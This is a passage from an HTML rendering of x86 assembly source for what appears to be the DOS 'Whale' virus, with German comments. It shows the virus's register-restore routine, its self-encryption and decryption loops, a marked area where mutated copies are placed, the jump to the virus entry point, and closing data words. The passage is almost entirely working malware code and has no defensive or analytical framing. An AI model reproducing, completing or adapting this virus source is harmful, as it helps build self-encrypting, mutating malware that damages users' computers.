                                             </span><span class="sc1">; alles lîschen</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">                         </span><span class="sc1">; RETF nach</span><span class="sc0">
                                             </span><span class="sc1">; Oberen-Speicher:01B1</span><span class="sc0">
                                             </span><span class="sc1">; Identisch mit CS:29C1</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( Get Original-Registers )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">RestoreRegs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2579</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257D</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257B</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2575</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2577</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D257F</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2581</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2590</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">L0L0L0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D4BAC</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Signal-Byte zur Erkennung,</span><span class="sc0">
                                     </span><span class="sc1">; ob Wal dekodiert ist oder nicht</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================================( VerschlÅsselt WAL )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Code_Whale</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">FirstByte</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">Code_len</span><span class="sc0">     </span><span class="sc1">; 2385h ; Wal-Size</span><span class="sc0">
</span><span class="sc5">LASTCODE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;^^^^^^^^^^^-- LETZTES VERSCHLUESSELTE BYTE        !</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D4BB5</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;vvvvvvvvvvv-- HIERHER WERDEN DIE MUTANTEN KOPIERT !</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J04BB9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04BB9</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">2567h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================( Normaler Einsprung )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Decode_Whale</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04BD1</span><span class="sc0">
</span><span class="sc5">J04BCF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; DUMMY !</span><span class="sc0">
</span><span class="sc5">J04BD1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">1876h</span><span class="sc0">        </span><span class="sc1">; SI = 1876, kann immer</span><span class="sc0">
                                        </span><span class="sc1">; geÑndert werden</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX = 4BCF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">Code_start</span><span class="sc0">   </span><span class="sc1">; BX = 2830</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc0">     </span><span class="sc1">; CX = 2385 wal-size</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">J04BE0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04BE0</span><span class="sc0">
                                        </span><span class="sc1">; BX = 4BB5</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">        </span><span class="sc1">; BX = 4C43 / 2433</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04BF5</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================================( Sprung zu ENTRY )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J04BF5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">              </span><span class="sc1">; SI ist 4C43</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">ENTRY</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================================================( ENDE )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0CE8BH</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">05605H</span><span class="sc0">
</span><span class="sc5">LASTBYTE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DB</span><span class="sc0">         </span><span class="sc2">34H</span><span class="sc0">

</span><span class="sc5">J04C01</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">00045h</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">05000h</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0DCE3h</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">09000h</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">01F00H</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">02000H</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">
        </span><span class="sc9">END</span><span class="sc0">  </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
